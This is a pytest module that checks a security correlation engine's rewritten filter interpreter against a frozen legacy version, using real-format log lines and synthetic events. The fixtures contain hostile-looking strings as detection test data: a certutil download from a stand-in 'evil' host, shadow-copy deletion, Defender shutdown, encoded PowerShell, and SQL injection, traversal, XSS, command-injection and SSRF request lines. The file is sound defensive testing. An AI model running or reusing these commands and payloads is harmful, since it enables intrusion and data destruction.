# backend/tests/unit/test_matches_filter_legacy_parity.py
"""Legacy-parity oracle for the correlation engine's filter interpreter.

In v1.6.4.x `_matches_filter` was generalised: the substring operators that
existed for `path` only (`path_contains`, `path_contains_all`, `path_excludes`)
now work on any field (`ua_contains`, `tags_excludes`, ...), key parsing is
cached and regexes are compiled once. Every rule shipped before that change
must keep behaving exactly as it did, so this module carries a VERBATIM frozen
copy of the previous interpreter (commit a57547f, correlation_engine.py lines
3276-3352; identifiers prefixed `_legacy_`, logic untouched) and drives both
implementations with the same filters and the same events:

  * every filter in the YAML corpus on disk and in BUILT_IN_RULES;
  * events the real normalizer produced from production-shaped log lines;
  * seeded synthetic events built to satisfy, nearly satisfy or miss each
    filter, then mutated (alias spellings, missing fields, None, "", case).

The corpus is split by vocabulary:

  * LEGACY-vocabulary filters (path_contains / path_contains_all /
    path_excludes, `<f>_gt`, `<f>_regex`, plain equality) — strict parity: no
    (filter, event) pair may yield a different boolean. The only permitted
    divergences are the two situations where the legacy code RAISED out of
    evaluate() and the new code fails closed instead: `<f>_gt` against a value
    that cannot be compared (TypeError), and a `path_*` clause against a
    non-string `path` (AttributeError on .lower()).
  * NEW-vocabulary filters (`ua_contains`, `tags_excludes`, ...) — these are
    rules that shipped dead: the legacy interpreter turned the key into an
    equality on a field literally named `ua_contains` and returned False for
    every event. The test proves exactly that (legacy is False everywhere)
    and reports how many such rules the generalisation revives.

Do not "fix" the legacy copy below: it is the oracle.
"""
from __future__ import annotations

import random
import re
from collections import defaultdict
from pathlib import Path

import pytest
import yaml

# Bound at import so it survives the monkeypatching of rules_loader.load_rules
# that _engine_for performs.
from app.services.rules_loader import load_rules as _real_load_rules

RULES_PATH = Path(__file__).parent.parent.parent / "app" / "rules"


# ---------------------------------------------------------------------------
# Frozen legacy interpreter (commit a57547f) — the oracle. Verbatim, with one
# deliberate seam: field reads go through the LIVE `_event_get`, so the oracle
# isolates the operator interpreter. The alias table (_FIELD_ALIASES) is a
# separate, independently-evolving concern — adding `cmdline` as a spelling of
# `command_line` is a rule-reachability fix, not an interpreter change, and
# must not register here as a parity break.
# ---------------------------------------------------------------------------

from app.services.correlation_engine import _event_get as _legacy_event_get  # noqa: E402


def legacy_matches_filter(event: dict, filt: dict) -> bool:
    """Return True when all filter key/value pairs match the event.

    Field reads go through _event_get, so a rule written as `method: POST`
    still matches an event that carries `request_method` — see _FIELD_ALIASES.
    """
    for key, expected in filt.items():
        actual = _legacy_event_get(event, key)

        # Numeric greater-than check: bytes_gt -> bytes > value
        if key.endswith("_gt"):
            field = key[:-3]  # strip "_gt"
            actual_val = _legacy_event_get(event, field)
            if actual_val is None or actual_val <= expected:
                return False
            continue

        # Regex match: command_line_regex → re.search(pattern, event["command_line"])
        if key.endswith("_regex"):
            field = key[:-6]  # strip "_regex"
            actual_val = _legacy_event_get(event, field)
            if actual_val is None or not re.search(str(expected), str(actual_val)):
                return False
            continue

        # List membership check
        if isinstance(expected, list):
            # path_contains: any element must be a substring of actual
            if key == "path_contains":
                path = event.get("path", "") or event.get("request_path", "") or event.get("url", "") or ""
                _p = path.lower()
                if not any(str(fragment).lower() in _p for fragment in expected):
                    return False
                continue
            # path_contains_all: every element must be a substring
            if key == "path_contains_all":
                path = event.get("path", "") or event.get("request_path", "") or event.get("url", "") or ""
                _p = path.lower()
                if not all(str(fragment).lower() in _p for fragment in expected):
                    return False
                continue
            # v1.6.3.5: path_excludes — fail the rule if path contains ANY listed fragment
            if key == "path_excludes":
                path = event.get("path", "") or event.get("request_path", "") or event.get("url", "") or ""
                _p = path.lower()
                if any(str(fragment).lower() in _p for fragment in expected):
                    return False
                continue
            if actual not in expected:
                return False
            continue

        if actual != expected:
            return False
    return True


# ---------------------------------------------------------------------------
# Corpus: every filter the engine will ever see (YAML on disk + in-code).
# ---------------------------------------------------------------------------

_LEGACY_SUBSTRING_KEYS = {"path_contains", "path_contains_all", "path_excludes"}


def _new_vocabulary_keys(filt: dict) -> list[str]:
    """Keys the legacy interpreter did NOT implement as substring operators."""
    return [
        k for k in filt
        if k.endswith(("_contains_all", "_contains", "_excludes")) and k not in _LEGACY_SUBSTRING_KEYS
    ]


def _all_corpus_filters() -> list[tuple[str, dict]]:
    from app.services.correlation_engine import BUILT_IN_RULES

    filters: list[tuple[str, dict]] = []
    for yaml_path in sorted(RULES_PATH.rglob("*.yaml")):
        data = yaml.safe_load(yaml_path.read_text(encoding="utf-8"))
        if not isinstance(data, dict) or data.get("kind") == "chain":
            continue
        filt = (data.get("condition") or {}).get("filter") or {}
        if filt:
            filters.append((f"yaml:{data.get('id')}", filt))
    for rule in BUILT_IN_RULES:
        filt = (rule.get("condition") or {}).get("filter") or {}
        if filt:
            filters.append((f"builtin:{rule.get('id')}", filt))
    assert len(filters) >= 200, f"corpus unexpectedly small: {len(filters)} filters"
    return filters


@pytest.fixture(scope="module")
def corpus_filters() -> list[tuple[str, dict]]:
    """Legacy-vocabulary filters only — the set that must behave identically."""
    return [(label, f) for label, f in _all_corpus_filters() if not _new_vocabulary_keys(f)]


@pytest.fixture(scope="module")
def new_vocabulary_filters() -> list[tuple[str, dict]]:
    """Filters that use the generalised operators — dead under legacy."""
    return [(label, f) for label, f in _all_corpus_filters() if _new_vocabulary_keys(f)]


# ---------------------------------------------------------------------------
# Events: real normalizer output for production-shaped lines.
# ---------------------------------------------------------------------------

_ATTACKER = "45.148.10.111"

_REAL_LINES = [
    ('INFO:     45.148.10.111:51000 - "GET /?q=union%20select HTTP/1.1" 200', "cayde6-api"),
    ('INFO:     45.148.10.111:51000 - "GET /api/v1/dashboard HTTP/1.1" 200', "cayde6-api"),
    ('INFO:     45.148.10.111:51000 - "POST /api/v1/auth/login HTTP/1.1" 401', "cayde6-api"),
    ('INFO:     45.148.10.111:51000 - "GET /../../etc/passwd HTTP/1.1" 404', "cayde6-api"),
    ('INFO:     45.148.10.111:51000 - "GET /x?u=http://169.254.169.254/latest HTTP/1.1" 200', "cayde6-api"),
    ('INFO:     45.148.10.111:51000 - "POST /upload.php HTTP/1.1" 200', "cayde6-api"),
    ('INFO:     45.148.10.111:51000 - "GET /?r=<script>alert(1)</script> HTTP/1.1" 200', "cayde6-api"),
    ('INFO:     45.148.10.111:51000 - "GET /api/v1/health HTTP/1.1" 200', "cayde6-api"),
    ('INFO:     45.148.10.111:51000 - "GET /api/v1/pods HTTP/1.1" 403', "cayde6-api"),
    ('INFO:     45.148.10.111:51000 - "GET /wp-login.php HTTP/1.1" 404', "cayde6-api"),
    ('INFO:     45.148.10.111:51000 - "GET /terminal/ws HTTP/1.1" 101', "cayde6-api"),
    ('INFO:     45.148.10.111:51000 - "POST /v1/rerank%20{{7*7}} HTTP/1.1" 500', "cayde6-api"),
    ('INFO:     45.148.10.111:51000 - "GET /?cmd=;%20ls HTTP/1.1" 200', "cayde6-api"),
    ('45.148.10.111 - - [24/Sep/2026:10:00:00 +0000] "GET /wp-login.php HTTP/1.1" 404 512 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"', "cayde6-frontend"),
    ('45.148.10.111 - - [24/Sep/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128"', "cayde6-frontend"),
    ('45.148.10.111 - - [24/Sep/2026:10:00:00 +0000] "POST /api/auth/callback HTTP/1.1" 401 0 "-" "curl/8.4.0"', "cayde6-frontend"),
    ('2026-07-24 11:05:12: [AEGIS] {"app":"sable","src_ip":"45.148.10.111","method":"GET","path":"/.env","status":404,"ua":"Mozilla/5.0 zgrab/0.x","cf_ray":"z-AMS"}', "sable"),
    ('2026-07-24 11:05:12: [AEGIS] {"app":"sable","src_ip":"45.148.10.111","method":"GET","path":"/solr/x?stream.url=file%3A%2F%2F%2Fetc%2Fpasswd","status":200,"ua":"curl","cf_ray":"z-AMS"}', "sable"),
    ('2026-07-24 11:05:12: [AEGIS] {"app":"sable","src_ip":"45.148.10.111","method":"POST","path":"/api/contact","status":200,"ua":"Mozilla/5.0 Safari/605","cf_ray":"z-AMS"}', "sable"),
    ('2026-07-24 11:05:12: [AEGIS] {"app":"sable","src_ip":"45.148.10.111","method":"GET","path":"/?q=union%20select%201,2,3--","status":200,"ua":"python-requests/2.31","cf_ray":"z-AMS"}', "sable"),
    ('2026-07-24 11:05:12: [AEGIS] {"app":"sable","src_ip":"45.148.10.111","method":"GET","path":"/mics/api/v2/sentry/mics-config/handleMessage?cmd=commandexec","status":200,"ua":"Nuclei - Open-source project","cf_ray":"z-AMS"}', "sable"),
    ("Sep 24 10:00:00 pi sshd[123]: Failed password for root from 45.148.10.111 port 51000 ssh2", "journalctl_sshd"),
    ("[SSH Honeypot] auth attempt root:toor from 45.148.10.111:51000", "honeypot_ssh"),
]


@pytest.fixture(scope="module")
def real_events() -> list[dict]:
    from app.services.event_normalizer import normalize

    events = [normalize(line, source=src) for line, src in _REAL_LINES]
    events = [ev for ev in events if ev is not None]
    assert len(events) >= 20, "normalizer dropped too many fixture lines"
    return events


# ---------------------------------------------------------------------------
# Synthetic events: satisfy / nearly satisfy / miss each filter, then mutate.
# ---------------------------------------------------------------------------

_SPELLINGS = {
    "path": ("path", "request_path", "url"),
    "method": ("method", "request_method"),
    "status": ("status", "response_status"),
    "ua": ("ua", "user_agent"),
    "user_agent": ("user_agent", "ua"),
    "request_path": ("request_path", "path", "url"),
}

# Realistic values for regex-guarded fields; some match, some do not.
_REGEX_BAG = [
    "bcdedit /set {default} recoveryenabled No",
    "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
    "certutil -urlcache -split -f http://evil/a.exe a.exe",
    "certutil.exe", "rundll32.exe", "rundll32 shell32.dll,Control_RunDLL",
    "wsmprovhost.exe", "svchost.exe", "C:\\Windows\\System32\\svchost.exe",
    "\\\\FILESRV\\C$\\Users", "\\\\FILESRV\\ADMIN$", "\\\\FILESRV\\share",
    "README_DECRYPT.txt", "how_to_decrypt.hta", "invoice.pdf", "photo.jpg.locked",
    "report.docx.crypt", "archive.tar.gz", "notes.txt",
    "vssadmin delete shadows /all /quiet", "wbadmin delete catalog -quiet",
    "powershell -enc SQBFAFgA", "net stop MsMpEng", "sc stop WinDefend",
    "", "plain text with nothing in it",
]

_NOISE_PATHS = [
    "/", "/index.html", "/api/v1/dashboard", "/static/app.js", "/favicon.ico",
    "/blog/2026/09/post", "/api/v1/health", "/_next/static/chunk.js",
]


def _rng_case(rng: random.Random, s: str) -> str:
    mode = rng.randrange(3)
    if mode == 0:
        return s
    if mode == 1:
        return s.upper()
    return "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in s)


def _spell(rng: random.Random, field: str) -> str:
    return rng.choice(_SPELLINGS.get(field, (field,)))


def _satisfying_event(rng: random.Random, filt: dict) -> dict:
    """Build an event meant to satisfy `filt` (best effort; regex fields draw
    from a realistic bag so both outcomes occur)."""
    ev: dict = {"event_type": "web_request", "source_ip": _ATTACKER}
    for key, expected in filt.items():
        if key.endswith("_contains_all"):
            field = key[: -len("_contains_all")]
            frags = expected if isinstance(expected, list) else [expected]
            body = " ".join(_rng_case(rng, str(f)) for f in frags)
            ev[_spell(rng, field)] = f"/a?{body}&z=1"
        elif key.endswith("_contains"):
            field = key[: -len("_contains")]
            frags = expected if isinstance(expected, list) else [expected]
            frag = _rng_case(rng, str(rng.choice(frags))) if frags else ""
            ev[_spell(rng, field)] = f"{rng.choice(_NOISE_PATHS)}{frag}?x=1"
        elif key.endswith("_excludes"):
            field = key[: -len("_excludes")]
            frags = expected if isinstance(expected, list) else [expected]
            if rng.random() < 0.3 and frags:  # sometimes violate it
                ev[_spell(rng, field)] = f"/api{_rng_case(rng, str(rng.choice(frags)))}"
            else:
                ev.setdefault(_spell(rng, field), rng.choice(_NOISE_PATHS))
        elif key.endswith("_gt"):
            field = key[: -len("_gt")]
            if isinstance(expected, (int, float)) and not isinstance(expected, bool):
                ev[field] = expected + rng.choice([1, 17, 100_000])
            else:
                ev[field] = expected
        elif key.endswith("_regex"):
            field = key[: -len("_regex")]
            ev[field] = rng.choice(_REGEX_BAG)
        elif isinstance(expected, list):
            ev[_spell(rng, key)] = rng.choice(expected) if expected else None
        else:
            ev[_spell(rng, key)] = expected
    return ev


def _mutate(rng: random.Random, ev: dict) -> dict:
    """Randomly perturb one or two fields of a synthetic event."""
    ev = dict(ev)
    for _ in range(rng.randint(1, 2)):
        if not ev:
            break
        key = rng.choice(list(ev))
        value = ev[key]
        mode = rng.randrange(7)
        if mode == 0:
            del ev[key]
        elif mode == 1:
            ev[key] = None
        elif mode == 2:
            ev[key] = ""
        elif mode == 3 and isinstance(value, str):
            ev[key] = _rng_case(rng, value)
        elif mode == 4 and isinstance(value, str):
            ev[key] = value[: max(0, len(value) - 3)]
        elif mode == 5 and isinstance(value, (int, float)) and not isinstance(value, bool):
            ev[key] = value - rng.choice([1, 2, 10 ** 6])
        elif mode == 6 and isinstance(value, str) and key in _SPELLINGS:
            # Legacy read `path` via an or-chain, everything else via aliases —
            # moving a value to a sibling spelling probes exactly that seam.
            del ev[key]
            ev[_spell(rng, key)] = value
    return ev


_RANDOM_POOL: dict[str, list] = {
    "request_path": ["/", "/wp-login.php", "/api/v1/secrets", "/?q=union select 1", "/../../etc/passwd",
                     "/upload.php", "/x?redirect=http://evil", "/api/v1/health", "/_next/static/a.js",
                     "/terminal/ws", "/v1/rerank {{7*7}}", "/mcp-rest/test/ stdio \"command\""],
    "path": ["/etc/crontab", "/var/spool/cron/root", "/tmp/exploit", "/Library/LaunchAgents/x.plist",
             "C:\\Windows\\Temp\\a.exe", "/var/run/docker.sock", "/etc/passwd", "authorized_keys", ""],
    "url": ["http://169.254.169.254/latest", "https://s3.amazonaws.com/b", "http://127.0.0.1:8000/", None],
    "request_method": ["GET", "POST", "PUT", "DELETE", None],
    "method": ["GET", "POST", "post"],
    "response_status": [200, 401, 403, 404, 500, None],
    "status": [200, 401],
    "user_agent": ["sqlmap/1.7", "Mozilla/5.0", "curl/8.4.0", "Nuclei", "zgrab/0.x", "", None],
    "ua": ["Nikto/2.1.6", "python-requests/2.31"],
    "tags": [["scanner"], ["api_401"], [], ["error_5xx", "scanner"]],
    "bytes": [0, 1024, 104_857_601, 52_428_801, 10_485_761, None],
    "direction": ["outbound", "inbound", None],
    "target_type": ["external", "internal"],
    "protocol": ["tls", "http", "http_api", "ssh_honeypot"],
    "service": ["ssh", "rdp", "ftp", "smb", "http"],
    "username": ["admin", "root", "diego", "test"],
    "destination_port": [22, 443, 6667, 9050, 8000, 4444],
    "destination_ip": ["23.254.164.92", "1.1.1.1", "142.11.206.73"],
    "source_ip": [_ATTACKER, "101.99.91.151", "203.0.113.10"],
    "command_line": _REGEX_BAG,
    "process_name": ["certutil.exe", "rundll32.exe", "bash", "python3"],
    "process_path": ["C:\\Windows\\System32\\wsmprovhost.exe", "/usr/bin/bash"],
    "parent_process_path": ["C:\\Windows\\System32\\svchost.exe", "explorer.exe"],
    "parent_process": ["mmc.exe", "wsmprovhost.exe", "explorer.exe"],
    "file_name": _REGEX_BAG,
    "new_extension": [".locked", ".txt", ".crypt", ".jpg"],
    "target_share": ["\\\\srv\\C$", "\\\\srv\\public"],
    "query_length": [10, 200, None],
    "size_change": [10, 2_000_000],
    "ticket_lifetime": [600, 40_000],
    "logon_type": ["network", "interactive"],
    "account_type": ["service", "user"],
    "encryption_type": ["RC4", "AES256"],
    "auth_method": ["publickey", "password"],
    "auth_result": ["success", "failure"],
    "time_of_day": ["off_hours", "business_hours"],
    "device_type": ["usb_storage", "hid"],
    "technique": ["hollowing", "injection"],
    "service_name": ["PSEXESVC", "spooler"],
    "tcp_flags": ["SYN", "ACK", "FIN"],
    "suid": [True, False], "privileged": [True, False], "signed": [True, False],
    "csrf_valid": [True, False], "banner_grab": [True, False], "port_forward": [True, False],
    "has_attachment": [True, False], "sni_host_mismatch": [True, False],
    "untrusted_registry": [True, False], "under_attack": [True, False],
    "domain_age_days": [3, 400], "domain_age_days_lt": [30, 3],
}


def _random_event(rng: random.Random) -> dict:
    ev: dict = {"event_type": rng.choice(["web_request", "http_request", "network_connection",
                                          "process_creation", "file_modify", "auth_failure"])}
    for field, values in _RANDOM_POOL.items():
        if rng.random() < 0.35:
            ev[field] = rng.choice(values)
    return ev


# ---------------------------------------------------------------------------
# Comparison harness
# ---------------------------------------------------------------------------

def _outcome(fn, event: dict, filt: dict):
    try:
        return ("ok", fn(event, filt))
    except Exception as exc:  # the legacy code could raise; record it
        return ("raise", type(exc).__name__)


def _compare(label: str, filt: dict, event: dict, mismatches: list, divergences: dict) -> None:
    from app.services.correlation_engine import _matches_filter as new_matches_filter

    old = _outcome(legacy_matches_filter, event, filt)
    new = _outcome(new_matches_filter, event, filt)
    if old[0] == "raise":
        # Permitted: legacy raised, new must fail closed — never raise, never True.
        divergences[old[1]] += 1
        if new != ("ok", False):
            mismatches.append((label, filt, event, old, new))
        return
    if new != old:
        mismatches.append((label, filt, event, old, new))


def _report(mismatches: list, total: int, divergences: dict, what: str) -> None:
    print(f"\n[parity] {what}: {total} comparisons, {len(mismatches)} mismatches, "
          f"legacy-raised cases handled: {dict(divergences)}")
    assert not mismatches, (
        f"{len(mismatches)} (filter, event) pairs diverge from legacy; first: "
        f"{mismatches[0]}"
    )


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

def test_every_corpus_filter_agrees_on_real_normalizer_events(corpus_filters, real_events):
    """Strongest production evidence: the whole corpus × real normalizer output."""
    mismatches: list = []
    divergences: dict = defaultdict(int)
    total = 0
    for label, filt in corpus_filters:
        for ev in real_events:
            _compare(label, filt, ev, mismatches, divergences)
            total += 1
    assert total >= 4_000
    _report(mismatches, total, divergences, "corpus x real events")


def test_every_corpus_filter_agrees_on_targeted_and_mutated_events(corpus_filters):
    """Events built to satisfy each filter, then perturbed at the exact seams
    the change touched (aliases, missing/None/"" fields, case)."""
    rng = random.Random(1337)
    mismatches: list = []
    divergences: dict = defaultdict(int)
    total = 0
    for label, filt in corpus_filters:
        for _ in range(12):
            base = _satisfying_event(rng, filt)
            _compare(label, filt, base, mismatches, divergences)
            total += 1
            for _ in range(3):
                _compare(label, filt, _mutate(rng, base), mismatches, divergences)
                total += 1
    assert total >= 9_000
    _report(mismatches, total, divergences, "corpus x targeted+mutated")


def test_every_corpus_filter_agrees_on_random_events(corpus_filters):
    rng = random.Random(2026)
    events = [_random_event(rng) for _ in range(150)]
    mismatches: list = []
    divergences: dict = defaultdict(int)
    total = 0
    for label, filt in corpus_filters:
        for ev in events:
            _compare(label, filt, ev, mismatches, divergences)
            total += 1
    assert total >= 30_000
    _report(mismatches, total, divergences, "corpus x random")


def test_new_vocabulary_rules_were_dead_under_legacy_and_are_revived(new_vocabulary_filters, real_events):
    """For every corpus rule that uses `<field>_contains/_contains_all/_excludes`
    on a non-path field, the legacy interpreter returned False on EVERY event
    (it compared the fragment list against a field literally named after the
    key). The new interpreter must fire at least one of them on real traffic,
    otherwise the generalisation changed nothing for the corpus."""
    from app.services.correlation_engine import _matches_filter as new_matches_filter

    rng = random.Random(4242)
    revived: set[str] = set()
    total = 0
    for label, filt in new_vocabulary_filters:
        events = list(real_events) + [_satisfying_event(rng, filt) for _ in range(12)]
        for ev in events:
            total += 1
            assert legacy_matches_filter(ev, filt) is False, (
                f"{label} was NOT dead under legacy for {ev!r} — vocabulary partition is wrong"
            )
            if new_matches_filter(ev, filt):
                revived.add(label)
    print(f"\n[parity] new-vocabulary rules in corpus: {len(new_vocabulary_filters)} "
          f"({total} legacy evaluations, all False); revived by the new interpreter: "
          f"{sorted(revived)}")
    if new_vocabulary_filters:
        assert revived, "no new-vocabulary rule fired on any event — generalisation ineffective"


def test_legacy_vocabulary_agrees_on_hand_picked_edge_cases():
    """Seams called out in the design, checked one by one."""
    cases = [
        # path or-chain: empty/None path falls through to request_path, then url
        ({"path": "", "request_path": "/x/../y"}, {"path_contains": ["../"]}),
        ({"path": None, "url": "/etc/passwd"}, {"path_contains": ["/etc/passwd"]}),
        ({"path": None, "request_path": None, "url": None}, {"path_contains": ["x"]}),
        ({}, {"path_contains": ["x"]}), ({}, {"path_excludes": ["x"]}), ({}, {"path_contains_all": []}),
        ({}, {"path_contains": []}), ({"request_path": "/a"}, {"path_contains_all": []}),
        ({"request_path": "/a"}, {"path_contains": [""]}), ({"request_path": "/a"}, {"path_excludes": [""]}),
        ({"request_path": "/A/404"}, {"path_contains": [404]}),  # non-str fragment
        # alias reads for equality
        ({"request_method": "POST"}, {"method": "POST"}), ({"method": "POST"}, {"request_method": "POST"}),
        ({"response_status": 401}, {"status": 401}), ({"user_agent": "curl"}, {"ua": "curl"}),
        ({"method": None, "request_method": "POST"}, {"method": "POST"}),  # first key present wins
        # equality / membership
        ({"destination_port": 6667}, {"destination_port": [6667, 6668]}),
        ({"destination_port": "6667"}, {"destination_port": [6667]}),
        ({"tags": ["scanner"]}, {"tags": ["scanner"]}),  # list vs list membership: False both
        ({"suid": True}, {"suid": True}), ({"suid": 1}, {"suid": True}), ({}, {"signed": False}),
        ({"x": None}, {"x": None}),
        # gt
        ({"bytes": 200}, {"bytes_gt": 100}), ({"bytes": 100}, {"bytes_gt": 100}), ({}, {"bytes_gt": 100}),
        ({"bytes": 100.5}, {"bytes_gt": 100}), ({"bytes": True}, {"bytes_gt": 0}),
        # regex
        ({"command_line": "CertUtil -urlcache"}, {"command_line_regex": "(?i)(-urlcache|-decode)"}),
        ({"command_line": "ls"}, {"command_line_regex": "(?i)(-urlcache|-decode)"}),
        ({"command_line": 123}, {"command_line_regex": r"\d+"}), ({}, {"x_regex": "a"}),
        ({"x": "a"}, {"x_regex": 5}),
        # a key with an unsupported suffix degrades to equality in both
        ({"domain_age_days": 3}, {"domain_age_days_lt": 30}),
        ({"domain_age_days_lt": 30}, {"domain_age_days_lt": 30}),
        # multi-clause combinations from real rules
        ({"request_method": "POST", "request_path": "/shell.PHP"}, {"method": "POST", "path_contains": [".php", ".jsp"]}),
        ({"request_path": "/api/v1/health"}, {"path_contains": ["/api/"], "path_excludes": ["/api/v1/health"]}),
        ({"request_path": "/api/v1/users"}, {"path_contains": ["/api/"], "path_excludes": ["/api/v1/health"]}),
        ({"direction": "outbound", "bytes": 200_000_000, "target_type": "external"},
         {"direction": "outbound", "bytes_gt": 104_857_600, "target_type": "external"}),
    ]
    mismatches: list = []
    divergences: dict = defaultdict(int)
    for ev, filt in cases:
        _compare("edge", filt, ev, mismatches, divergences)
    _report(mismatches, len(cases), divergences, "hand-picked edges")


def test_documented_divergences_fail_closed_where_legacy_raised():
    """The two places the legacy interpreter blew up mid-evaluate() are now a
    plain non-match. This pins the intended behaviour so it is not accidental."""
    from app.services.correlation_engine import _matches_filter

    with pytest.raises(TypeError):
        legacy_matches_filter({"bytes": "1000"}, {"bytes_gt": 100})
    assert _matches_filter({"bytes": "1000"}, {"bytes_gt": 100}) is False

    with pytest.raises(AttributeError):
        legacy_matches_filter({"path": 42}, {"path_contains": ["4"]})
    assert _matches_filter({"path": 42}, {"path_contains": ["4"]}) is False


# ---------------------------------------------------------------------------
# End-to-end before/after through CorrelationEngine.evaluate() — awaited.
# ---------------------------------------------------------------------------

_UA_RULE = {
    "id": "test_ua_scanner_probe",
    "name": "Scanner UA probe (test)",
    "kind": "sigma",
    "severity": "medium",
    "tactics": ["reconnaissance"],
    "techniques": ["T1595"],
    "data_sources": ["pm2"],
    "condition": {
        "event_type": "http_request",
        "filter": {"ua_contains": ["sqlmap", "nikto", "nuclei"]},
    },
    "entityMappings": [],
}


def _engine_for(rules_dir: Path, monkeypatch: pytest.MonkeyPatch):
    """A CorrelationEngine built through the REAL __init__ — so every attribute
    the constructor sets (including ones added by later changes) is present —
    with three things redirected: the YAML pack comes from `rules_dir`, no
    filesystem watcher is started, and the in-code BUILT_IN_RULES/CHAIN_RULES
    are not merged, so the engine holds exactly the rules under test. Trigger
    side effects (event bus, incident creation, fast triage) are stubbed.

    Deliberately not the `__new__` + hand-set-attributes pattern: that breaks
    the moment __init__ grows a new attribute that evaluate() reads.
    """
    from app.services import correlation_engine as ce
    from app.services import rules_loader

    monkeypatch.setattr(rules_loader, "load_rules", lambda _path: _real_load_rules(rules_dir))
    monkeypatch.setattr(rules_loader, "start_watcher", lambda _pack, _path: None)
    monkeypatch.setattr(ce, "BUILT_IN_RULES", [])
    monkeypatch.setattr(ce, "CHAIN_RULES", [])
    engine = ce.CorrelationEngine()
    assert engine._rule_pack is not None, "engine fell back to in-code rules; pack did not load"

    fired: list[str] = []

    async def _record(rule, event):
        fired.append(rule["id"])

    async def _noop(*_a, **_k):
        return None

    engine._on_rule_triggered = _record
    engine._run_fast_triage = _noop
    return engine, fired


async def test_ua_contains_rule_fires_now_and_was_dead_before(tmp_path, monkeypatch):
    """Concrete before/after: the same rule and the same real event. Under the
    legacy interpreter `ua_contains` compared the list against a field
    literally named `ua_contains` and never matched."""
    from app.services import correlation_engine as ce
    from app.services.event_normalizer import normalize

    rules_dir = tmp_path / "sigma" / "recon"
    rules_dir.mkdir(parents=True)
    (rules_dir / "ua_probe.yaml").write_text(yaml.dump(_UA_RULE), encoding="utf-8")

    event = normalize(
        '2026-07-24 11:05:12: [AEGIS] {"app":"sable","src_ip":"45.148.10.111","method":"GET",'
        '"path":"/wp-login.php","status":404,"ua":"sqlmap/1.7.2#stable (https://sqlmap.org)","cf_ray":"z-AMS"}',
        source="sable",
    )
    assert event is not None and event["event_type"] == "http_request"
    assert event["user_agent"] == "sqlmap/1.7.2#stable (https://sqlmap.org)"

    # BEFORE: legacy interpreter swapped in — rule loads, never fires.
    with pytest.MonkeyPatch.context() as legacy_patch:
        engine, fired = _engine_for(tmp_path, legacy_patch)
        assert "test_ua_scanner_probe" in engine._rule_pack.by_id
        legacy_patch.setattr(ce, "_matches_filter", legacy_matches_filter)
        assert await engine.evaluate(dict(event)) == []
        assert fired == []

    # AFTER: current interpreter — the same event fires the rule.
    engine, fired = _engine_for(tmp_path, monkeypatch)
    triggered = await engine.evaluate(dict(event))
    assert [r["id"] for r in triggered] == ["test_ua_scanner_probe"]
    assert fired == ["test_ua_scanner_probe"]

    # And a benign browser on the same path stays quiet.
    benign = dict(event, user_agent="Mozilla/5.0 (Macintosh) Safari/605.1.15", source_ip="45.148.10.112")
    assert await engine.evaluate(benign) == []
